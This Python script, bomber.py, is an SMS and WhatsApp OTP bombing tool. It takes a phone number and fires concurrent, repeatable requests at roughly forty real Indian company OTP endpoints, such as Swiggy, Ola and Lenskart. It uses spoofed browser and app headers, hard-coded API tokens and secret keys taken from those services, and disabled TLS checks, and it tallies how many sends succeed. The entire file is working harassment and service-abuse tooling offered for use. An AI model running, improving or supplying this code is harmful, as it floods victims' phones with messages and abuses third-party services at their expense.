# language: Python, file: bomber.py, runtime: Python 3.10+, target: Linux/Render

import asyncio
import aiohttp
import time

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass


# ── single canonical _fire ────────────────────────────────────────────────────
async def _fire(session: aiohttp.ClientSession, cfg: dict, phone: str):
    """Fire one API — returns (name, type, fired:bool)"""
    try:
        url  = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
        data = cfg["data"](phone) if cfg["data"] else None
        h    = {k: (v(data) if callable(v) else v) for k, v in cfg["headers"].items()}
        to   = aiohttp.ClientTimeout(total=10.0, connect=4.0, sock_read=6.0)

        if cfg["method"] == "GET":
            async with session.get(url, headers=h, timeout=to, ssl=False) as r:
                body  = (await r.text())[:200]
                fired = r.status < 400
                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:80]}")
                return cfg["name"], cfg["type"], fired
        else:
            async with session.post(url, headers=h, data=data, timeout=to, ssl=False) as r:
                body  = (await r.text())[:200]
                fired = r.status < 400
                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:80]}")
                return cfg["name"], cfg["type"], fired
    except Exception as e:
        print(f"[{cfg['name']}] TIMEOUT/ERR | {str(e)[:80]}")
        return cfg["name"], cfg["type"], False


# ── API configs ───────────────────────────────────────────────────────────────
API_CONFIGS = [

    # ── SMS ──────────────────────────────────────────────────────────────────
    {
        "name": "IndiaMART",
        "url": "https://my.indiamart.com/api/otp.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Origin": "https://my.indiamart.com",
            "Referer": "https://my.indiamart.com/",
        },
        "data": lambda p: f"mobile={p}&flag=1",
        "type": "SMS",
    },
    {
        "name": "Meesho",
        "url": "https://meesho.com/api/v1/user/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://meesho.com",
            "Referer": "https://meesho.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/",
        },
        "data": lambda p: f"phone={p}&countryCode=IN",
        "type": "SMS",
    },
    {
        "name": "Wakefit",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "Origin": "https://www.wakefit.co",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}',
        "type": "SMS",
    },
    {
        "name": "Shiprocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "Origin": "https://app.shiprocket.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1",
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Univest",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {"User-Agent": "okhttp/3.9.1"},
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Jockey SMS",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/",
        },
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Stratzy SMS",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","email":"test@gmail.com","device_platform":"web"}}',
        "type": "SMS",
    },
    {
        "name": "LendingPlate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://lendingplate.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3",
        "type": "SMS",
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "country_code": "IN",
            "Origin": "https://www.hungama.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","device":"web","variant":"v1","templateCode":1}}',
        "type": "SMS",
    },
    {
        "name": "GoPinkCabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}",
        "type": "SMS",
    },
    {
        "name": "Beepkart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "appname": "Website",
            "Origin": "https://www.beepkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","city":362,"source":"myaccount","consent":false}}',
        "type": "SMS",
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Caller": "web_app",
            "Origin": "https://newme.asia",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}',
        "type": "SMS",
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"contact_no":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "MeruCabs",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234bae1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "client": "app",
            "User-Agent": "Dart/3.6 (dart:io)",
        },
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}',
        "type": "SMS",
    },
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Country-Code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Shemaroo",
        "url": "https://www.shemarooме.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemarooме.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f"mobile_no=%2B91{p}",
        "type": "SMS",
    },
    {
        "name": "Rapido",
        "url": "https://api.rapido.bike/api/auth/v5/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://rapido.bike",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phoneNo":"{p}","countryCode":"+91"}}',
        "type": "SMS",
    },
    {
        "name": "Tata1mg",
        "url": "https://www.1mg.com/api/v5/auth/request_login_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.1mg.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","type":"phone"}}',
        "type": "SMS",
    },
    {
        "name": "Ola",
        "url": "https://user.olacabs.com/v1/user/mobile",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-App-Token": "4ac01f46-7dd0-4ae9-9a0f-4564b55c7d12",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile_number":"{p}","country_code":"IND"}}',
        "type": "SMS",
    },
    {
        "name": "Puma",
        "url": "https://in.puma.com/api/account/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://in.puma.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"IN"}}',
        "type": "SMS",
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/api/v3/user/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.nykaa.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile":"{p}","countryCode":"91"}}',
        "type": "SMS",
    },
    {
        "name": "PharmEasy",
        "url": "https://api.pharmeasy.in/api/account/v2/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNumber":"{p}","countryCode":"+91","version":2}}',
        "type": "SMS",
    },
    {
        "name": "Blinkit",
        "url": "https://blinkit.com/v1/user/registration/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://blinkit.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"number":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/auth/user/login/get-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bigbasket.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","type":"mobile"}}',
        "type": "SMS",
    },
    {
        "name": "Dunzo",
        "url": "https://api.dunzo.com/api/v3/users/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.dunzo.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone_number":"{p}","country_code":"91"}}',
        "type": "SMS",
    },
    {
        "name": "UrbanClap",
        "url": "https://consumer.urbancompany.com/identity/v5/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.urbancompany.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile":"{p}","countryCode":"+91"}}',
        "type": "SMS",
    },
    {
        "name": "Groww",
        "url": "https://groww.in/v1/api/user/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNo":"{p}"}}',
        "type": "SMS",
    },

    # ── WhatsApp ──────────────────────────────────────────────────────────────
    {
        "name": "Jockey WA",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/",
        },
        "data": None,
        "type": "WA",
    },
    {
        "name": "Stratzy WA",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "WA",
    },
    {
        "name": "EkaCare WA",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Version": "1382",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3",
        },
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}',
        "type": "WA",
    },
    {
        "name": "Foxy WA",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}',
        "type": "WA",
    },
    {
        "name": "Rappi WA",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)",
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}',
        "type": "WA",
    },
    {
        "name": "KPNFresh WA",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11",
        },
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}',
        "type": "WA",
    },
]


# ── runner ────────────────────────────────────────────────────────────────────
async def run_bomber(phone: str, mode: str = "ALL", rounds: int = 1) -> dict:
    pool = (
        API_CONFIGS if mode == "ALL"
        else [c for c in API_CONFIGS if c["type"] == mode]
    )
    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=20,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )
    sms_fired = wa_fired = call_fired = total_fired = 0
    start = time.time()

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"Accept": "*/*", "Accept-Language": "en-IN,en;q=0.9"},
    ) as session:
        all_tasks = [
            _fire(session, cfg, phone)
            for _ in range(rounds)
            for cfg in pool
        ]
        results = await asyncio.gather(*all_tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, Exception):
                continue
            name, typ, fired = res
            if fired:
                total_fired += 1
                if typ == "SMS":    sms_fired  += 1
                elif typ == "WA":   wa_fired   += 1
                elif typ == "CALL": call_fired += 1

    elapsed = time.time() - start
    total   = len(pool) * rounds
    return {
        "sms":   sms_fired,
        "wa":    wa_fired,
        "call":  call_fired,
        "fired": total_fired,
        "total": total,
        "rps":   round(total / elapsed, 2) if elapsed else 0,
    }
